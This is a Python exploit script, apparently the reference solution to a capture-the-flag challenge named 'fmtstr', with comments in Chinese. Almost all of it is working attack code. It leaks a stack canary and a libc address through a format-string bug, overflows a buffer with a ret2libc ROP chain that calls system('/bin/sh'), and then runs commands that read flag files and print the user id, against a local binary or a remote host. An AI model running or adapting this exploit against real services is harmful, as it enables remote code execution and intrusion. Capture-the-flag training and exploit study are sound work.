#!/usr/bin/env python3
"""fmtstr 参考解：格式化字符串泄露 canary/libc -> 栈溢出 ret2libc。

用法：python3 solve.py [host port]   （不带参数则在本地跑 ./dist/fmtstr）
"""
import os
import re
import socket
import struct
import subprocess
import sys
import time

CANARY_IDX = 41
LIBC_IDX = 43
LIBC_LEAK_OFF = 0x2A1CA          # 泄露的 __libc_start_call_main 内部返回地址
PAD_TO_CANARY = 264              # buf[256] -> canary 的距离（0x110-0x8）
OFF_SYSTEM = 0x58750
OFF_BINSH = 0x1CC42F
OFF_POP_RDI = 0x10C08D
OFF_RET = 0x10C08E


def p64(x):
    return struct.pack("<Q", x)


class Conn:
    def __init__(self, host=None, port=None):
        if host:
            self.s = socket.create_connection((host, port), timeout=15)
        else:
            path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dist", "fmtstr")
            self.p = subprocess.Popen([path], stdin=subprocess.PIPE,
                                      stdout=subprocess.PIPE, bufsize=0)
            self.s = None

    def recv_until(self, marker, timeout=10):
        buf = b""
        end = time.time() + timeout
        while marker not in buf and time.time() < end:
            try:
                chunk = self.s.recv(4096) if self.s else os.read(self.p.stdout.fileno(), 4096)
            except OSError:
                break
            if not chunk:
                break
            buf += chunk
        return buf

    def send(self, data):
        if self.s:
            self.s.sendall(data)
        else:
            self.p.stdin.write(data)
            self.p.stdin.flush()

    def close(self):
        if self.s:
            self.s.close()
        else:
            self.p.kill()


def main():
    host = sys.argv[1] if len(sys.argv) > 2 else None
    port = int(sys.argv[2]) if len(sys.argv) > 2 else None
    c = Conn(host, port)

    c.recv_until(b"name> ")
    # 定长 255 字节：read 恰好读完，不留残字节给下一次 read
    base = f"%{CANARY_IDX}$p.%{LIBC_IDX}$p".encode()
    c.send(base + b"A" * (255 - len(base)))
    out = c.recv_until(b"data> ", timeout=10)
    m = re.search(rb"(0x[0-9a-f]+)\.(0x[0-9a-f]+)", out)
    if not m:
        print("[-] 泄露失败:", out[:200])
        return 1
    canary = int(m.group(1), 16)
    libc_leak = int(m.group(2), 16)
    libc = libc_leak - LIBC_LEAK_OFF
    print(f"[+] canary   = {hex(canary)}")
    print(f"[+] libc base= {hex(libc)}")

    rop = (p64(libc + OFF_RET) + p64(libc + OFF_POP_RDI) +
           p64(libc + OFF_BINSH) + p64(libc + OFF_SYSTEM))
    payload = b"A" * PAD_TO_CANARY + p64(canary) + b"B" * 8 + rop
    c.send(payload + b"\n")
    time.sleep(0.4)

    c.send(b"echo PWNED; cat /flag 2>/dev/null; cat flag.txt 2>/dev/null; id\n")
    time.sleep(0.8)
    out = b""
    try:
        out = c.s.recv(65536) if c.s else os.read(c.p.stdout.fileno(), 65536)
    except OSError:
        pass
    print("[+] 输出:", out.decode("utf-8", "replace")[:600])
    ok = b"PWNED" in out or b"uid=" in out
    print("[+] 利用", "成功" if ok else "失败")
    c.close()
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
